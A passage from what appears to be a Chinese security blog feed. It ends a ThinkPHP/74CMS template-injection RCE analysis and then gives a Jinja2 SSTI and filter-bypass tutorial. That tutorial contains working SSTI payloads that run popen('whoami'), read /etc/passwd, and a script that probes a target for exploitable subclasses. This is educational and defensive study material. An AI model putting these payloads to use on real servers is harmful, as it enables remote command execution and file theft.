alt=""></p><p>ERR代表一般性错误，<code>$destination</code>是日志的存储位置，日志文件名是有<code>年_月_日</code>组成。</p><p>根据官方通告，漏洞代码位于<code>Application/Common/Controller/BaseController.class.php</code>的<code>assign_resume_tpl</code>方法，用于渲染简历模板：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160033.png" alt=""></p><p>继续跟进fetch函数，该函数位于<code>Controllor.class.php</code>文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160208.png" alt=""></p><p>函数内部又调用了<code>ThinkPHP/Lirary/Think/View.class.php</code>类中的<code>fetch</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160728.png" alt=""></p><p><code>content</code>为空进入第一个if判断，模板文件不存在的话直接返回，下一个if语句判断<code>TMPL_ENGINE_TYPE</code>是否是<code>php</code>，我们可以全局搜索这个常量，在<code>ThinkPHP/Conf/convention.php</code>中定义为<code>Think</code>，也就是说使用Think模板，那么就进入到else语句中。</p><p>首先构造一个参数数组<code>$params</code>，然后将调用静态方法<code>Hook::listen</code>，继续跟进，位于<code>ThinkPHP/Library/Hook.class.php</code>文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215161649.png" alt=""></p><p>此时<code>tag=view_parse</code>，该方法会查找<code>$tags</code>中有没有绑定<code>view_parse</code>事件的方法，然后用foreach遍历<code>$tags</code>属性，并执行<code>Hook:exec</code>方法。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215172131.png" alt=""></p><p>此方法会检查行为名称中是否存在<code>Behavior</code>，若存在此关键字，行为扩展必须使用run入口方法，关于Hook的配置在<code>/ThinkPHP/Mode/common.php</code>中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184343.png" alt=""></p><p>继续跟进到<code>ThinkPHP/Behavior/ParseTemplateBehavior.class.php</code>，找到文件中的run方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184717.png" alt=""></p><p>已知74CMS采用的是Think模板引擎，当首次运行时不存在缓存文件，会进入到else语句中，新建一个Template类，在调用类中的fetch方法，位于<code>ThinkPHP/Library/Think/Template.class.php</code>文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185208.png" alt=""></p><p>调用<code>loadTemplate()</code>，将其存入<code>templateCacheFile</code>中，我们跟入<code>loadTemplate</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185930.png" alt=""></p><p>首先读取templateFile的文件内容存到tmplContent中，然后再调用compiler函数编译模板内容，继续跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215190136.png" alt=""></p><p>传入的模板内容未经过过滤就直接被拼接到<code>$tmplContent</code>变量，然后返回<code>loadTemplate</code>方法，调用<code>put</code>方法写入缓存文件，并返回缓存文件名，于是我们再回归到<code>fetch()</code>方法，调用了<code>Storage::load</code>，位于<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215191004.png" alt=""></p><p>这里就直接包含文件，最终造成了模板注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;骑士CMS模板注入-日志包含RCE复现&quot;&gt;骑士CMS模板注入+日志包含RCE复现&lt;/h1&gt;
&lt;p&gt;本文参考自TimeLine Sec团队成员microworld的复现记录。&lt;/p&gt;
&lt;h2 id=&quot;0x01-漏洞概述&quot;&gt;0x01 漏洞概述&lt;/h2&gt;
&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>jinja_SSTI_Bypass</title>
    <link href="http://ca0y1h.top/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass/"/>
    <id>http://ca0y1h.top/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass/</id>
    <published>2020-12-19T13:23:14.000Z</published>
    <updated>2020-12-19T13:51:50.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jinja2-SSTI-Bypass">jinja2 SSTI &amp; Bypass</h1><p>本文主要针对jinja2的SSTI做一些讲解和说明。</p><h2 id="常用的内建属性">常用的内建属性</h2><h3 id="class"><code>__class__</code></h3><p>用于返回对象所属的类，和<code>type()</code>相同：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="base"><code>__base__</code></h3><p>以字符串的形式返回一个类所继承的类，一般情况下是object</p><h3 id="bases"><code>__bases__</code></h3><p>以元组的形式返回一个类所继承的类</p><h3 id="mro"><code>__mro__</code></h3><p>返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Father</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">GrandFather</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">son</span>(<span class="params">Father,GrandFather</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(son.__base__)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Father</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__bases__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__mro__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.son&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;, &lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="subclasses"><code>__subclasses__()</code></h3><p>得到object类后，就可以用<code>__subclasses__()</code>获取所有的子类：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;......</span><br></pre></td></tr></table></figure><h3 id="dict"><code>__dict__</code></h3><p>我们在获得到一个模块时想调用模块中的方法，恰好该方法被过滤了，就可以用该方法bypass</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__dict__[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br></pre></td></tr></table></figure><p>与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有<code>__dict__</code>属性的，如<code>[].__dict__</code>会返回错误</p><p><code>__dict__</code>只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性</p><p>可以使用<code>__dict__</code>来间接调用一些属性或方法，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__[<span class="string">&#x27;append&#x27;</span>](a, <span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="string">&#x27;ling&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="init"><code>__init__</code></h3><p><code>__init__</code>用于初始化类，作用就是为了得到function/method模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, a, b</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.a = a</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Base</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Child</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Child</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">__init__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">__init__</span> <span class="title">at</span> 0<span class="title">x10cc23e50</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">func</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">func</span> <span class="title">at</span> 0<span class="title">x10cc23ee0</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="globals"><code>__globals__</code></h3><p>会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>__init__</code>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__</span><br><span class="line">&lt;bound method Student.__init__ of &lt;__main__.Student object at <span class="number">0x10cc71880</span>&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__.__globals__</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__.__globals__</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__</span><br><span class="line">&lt;function Student.__init__ at <span class="number">0x10cc23f70</span>&gt;</span><br></pre></td></tr></table></figure><p>果该关键字被过滤了我们可以使用<code>__getattribute__</code>，以下两者等效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__[&#39;sys&#39;]</span><br><span class="line">__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;sys&#39;]</span><br></pre></td></tr></table></figure><h2 id="builtins、-builtin-、-builtins-的区别"><code>builtins</code>、<code>__builtin__</code>、<code>__builtins__</code>的区别</h2><p>在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。</p><p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p><p>python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> builtins</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtins</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>而<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="构造链的思路">构造链的思路</h2><h3 id="第一步">第一步</h3><p>使用<code>__class__</code>来获取内置类所对应的类，可以使用<code>str</code>，<code>dict</code>，<code>tuple</code>，<code>list</code>等来获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第二步">第二步</h3><p>拿到<code>object</code>基类</p><p>用<code>__bases__[0]</code>拿到基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>__base__</code>拿到基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>__mro__[1]</code>或<code>__mro__[-1]</code>拿到基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span>[-1]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第三步">第三步</h3><p>用<code>__subclasses__()</code>拿到子类列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure><h3 id="第四步">第四步</h3><p>在子类列表中寻找中寻找可以getshell的类</p><h2 id="寻找利用链">寻找利用链</h2><p>我们一般来说是先知晓一些可以getshell的类，然后再去跑这些类的索引，然后这里先讲述如何去跑索引，再详写可以getshell的类</p><p>这里先给出一个在本地遍历的脚本，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以<code>popen</code>为例子。</p><p>local_find.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">&#x27;popen&#x27;</span></span><br><span class="line">num  = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__base__[<span class="number">0</span>].__subclasses__:</span><br><span class="line">  num += <span class="number">1</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">      print(num, i)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>运行这个脚本后：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219134702.png" alt=""></p><p>可以发现<code>object</code>基类的第132个子类名为<code>os._wrap_close</code>的这个类有popen方法</p><p>先调用它的<code>__init__</code>方法进行初始化类，再调用<code>__globals__</code>可以获取到方法内以字典的形式返回的方法、属性等值，最后调用<code>popen</code>函数来执行命令</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219135353.png" alt=""></p><p>但是上面的方法仅限于在本地寻找，remote_find.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">  time.sleep(<span class="number">0.1</span>)</span><br><span class="line">  payload = <span class="string">&quot;&#123;&#123;().__class__.__mro__[-1].__subclasses__()[%s]&#125;&#125;&quot;</span> % i</span><br><span class="line">  url = <span class="string">&quot;&quot;</span></span><br><span class="line">  r = requests.post(url + payload)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;catch_warnings&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    print(r.text)</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="python3的方法">python3的方法</h3><h4 id="os-wrap-close类中的popen"><code>os._wrap_close</code>类中的<code>popen</code></h4><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="import-中的os"><code>__import__</code>中的<code>os</code></h4><p>把上面<code>local_find.py</code>脚本中的search变量换成<code>__import__</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219140616.png" alt=""></p><p>可以看到有5个类下是包含<code>__import__</code>的，随便用一个即可</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="python2的方法">python2的方法</h3><p>tips：python2的<code>string</code>类型不直接从属于属于基类，所以要用两次 <code>__bases__[0]</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219140835.png" alt=""></p><h4 id="file类读写文件"><code>file</code>类读写文件</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219141043.png" alt=""></p><p>然后直接调用里面的方法即可，payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="warnings类中的linecache"><code>warnings</code>类中的<code>linecache</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">58</span>]</span><br><span class="line">&lt;<span class="class"><span 